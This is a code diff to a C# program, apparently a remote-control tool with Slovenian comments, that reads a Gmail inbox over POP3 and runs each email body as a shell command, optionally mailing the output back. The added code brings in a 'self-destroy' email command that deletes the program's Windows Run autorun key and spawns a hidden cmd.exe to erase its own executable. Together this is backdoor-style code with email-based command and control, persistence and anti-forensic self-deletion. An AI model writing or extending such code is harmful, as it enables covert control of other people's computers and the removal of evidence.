@@ -2,9 +2,11 @@ using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Net.Mail;
+using System.Reflection;
+using System.Threading;
+using Microsoft.Win32;
 using OpenPop.Mime;
 using OpenPop.Pop3;
-using System.Threading;
 
 namespace RCM
 {
@@ -13,8 +15,8 @@ namespace RCM
         static void Main(string[] args)
         {
             //podatki o email racunu
-            string username = "username@gmail.com";
-            string password = "passwrd";
+            string username = "USERNAME@gmail.com";
+            string password = "PASSWORD";
 
             //podatki za sprejem mailov
             string hostname = "pop.gmail.com";
@@ -37,13 +39,18 @@ namespace RCM
             /*
              * REPLAY SETTINGS
              * Če zelite, da vam program v odgovor pošlje output terminala,
-             * je potrebno pred ukazom vpisati replay:
+             * je potrebno pred ukazom vpisati (replay_word) replay:
              * 
              * primer: "ping 192.168.1.1"
              * Če hočemo odgovor bo vsebina maila izgledala "replay:ping 192.168.1.1"
              */
-
-
+            string replay_word = "replay:";
+            /*
+             * SELF-DESTROY body: (destroyMe) self-destroy
+             * delete key in startup
+             * delete file (temp??)
+             */
+            string destroyMe = "self-destroy";
             /*
              * Posiljanje:
              * -na siolu ne deluje,
@@ -83,12 +90,17 @@ namespace RCM
                         //če obstaja vsebina
                         if (!String.IsNullOrEmpty(content))
                         {
+                            if (content == destroyMe)
+                            {
+                                DestroyMe();
+                            }
                             bool replay = false;
                             //ugotovimo ali je zahtevan odgovor
-                            if (content.Substring(0, 7) == "replay:")
+                            int rep_len = replay_word.Length;
+                            if (content.Substring(0, rep_len) == replay_word)
                             {
                                 replay = true;
-                                content = content.Substring(7);
+                                content = content.Substring(rep_len);
                             }
 
                             //izpis podatkov
@@ -128,6 +140,20 @@ namespace RCM
                 //Console.WriteLine("-------------------------------------------------");                
                 Thread.Sleep(interval);
             }
+        }
+
+        private static void DestroyMe()
+        {
+            //delete autorun keys
+            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            rk.DeleteValue("RCM", false);
+
+            //delete RCM.exe
+            var exepath = Assembly.GetEntryAssembly().Location;
+            var info = new ProcessStartInfo("cmd.exe", "/C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \"" + exepath + "\"");
+            info.WindowStyle = ProcessWindowStyle.Hidden;
+            Process.Start(info).Dispose();
+            Environment.Exit(0);
         }
 
         public static List<Message> FetchAllMessages(string hostname, int port, bool useSsl, string username, string password)
